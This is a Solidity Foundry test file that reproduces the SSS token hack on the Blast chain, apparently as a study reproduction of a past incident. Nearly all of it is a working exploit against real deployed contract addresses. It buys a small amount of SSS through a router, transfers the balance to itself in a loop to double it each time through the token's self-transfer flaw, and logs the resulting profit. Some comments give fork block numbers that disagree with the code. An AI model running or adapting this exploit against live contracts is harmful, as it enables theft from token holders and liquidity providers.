


// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../interface.sol";





/*
https://rekt.news/sss-rekt/
 incredibly simple mint hack 
*/



interface UniPair{
//function swap ( uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out) external;
function swap ( uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

}

interface Router{
    function swapExactETHForTokens(uint256 amountOutMin,address[] memory path,address to,uint256 deadline) payable external; 
    function swapExactTokensForETH(uint amountIn,uint amountOutMin,address[] memory path,address to, uint deadline) external;
}


CheatCodes constant cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    //SSSToken on blast, which can be doubled.
IERC20 constant SSSTOKEN = IERC20(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);

// SSS-WETH TRADING PAIR
address constant pair = 0x92F32553cC465583d432846955198F0DDcBcafA1;
address constant router = 0x98994a9A7a2570367554589189dC9772241650f6;

//we fork at block 1113889, same block
contract SSSExploit is Test {
    address attacker = address(this);
    address owner = 0x81957859126df74C2d61760d205F4960D95aC735;
    IWETH WETH = IWETH(payable(0x4300000000000000000000000000000000000004));

    function setUp() public {
                                         
        cheats.createSelectFork("blast", 1111430 ); // fork mainnet at 10307563
        cheats.deal(address(this), 10 ether);

    }
    

    function testsafeTransfer() public {

           address[] memory eth_to_token_path = new address[](2);
        eth_to_token_path[0] = address(WETH);
        eth_to_token_path[1] = address(SSSTOKEN);

        address[] memory token_to_eth_path = new address[](2);
        token_to_eth_path[0] = address(SSSTOKEN); 
        token_to_eth_path[1] = address(WETH);
        //we get weth from eth
        //swap from router for sss tokens(can only give ourselves a very smal amount due to the limit per tx)
        //simply keep transferring to ourselves and doubling our balance
        

     
         

        emit log_named_uint(
            "Eth Balance: ", address(this).balance);
         //UniPair(pair).swap(0,1 ether,address(this),new bytes(0));

     

        Router(router).swapExactETHForTokens{value: 0.01 ether}(
            700864831669798836500208604,
            eth_to_token_path,
            address(this),
            	block.timestamp+500
        );
        uint token_amount_before  = SSSTOKEN.balanceOf(attacker);

            emit log_named_uint(
            "Eth Balance: ", address(this).balance);

         emit log_named_uint(
            "Tokens AFTER Swap            ", SSSTOKEN.balanceOf(address(this))/1e18);

            //
            for(uint i = 0;i<20;i++){
            SSSTOKEN.transfer(address(this),SSSTOKEN.balanceOf(address(this)));
            }
          

            emit log_named_uint(
            "Tokens AFTER transfer exploit", SSSTOKEN.balanceOf(attacker)/1e18);

            uint profit = SSSTOKEN.balanceOf(attacker) - token_amount_before;
            
             emit log_named_uint(
            "Total profit                 ", profit/1e18);


     
    

       
    }
        receive() external payable {}

}
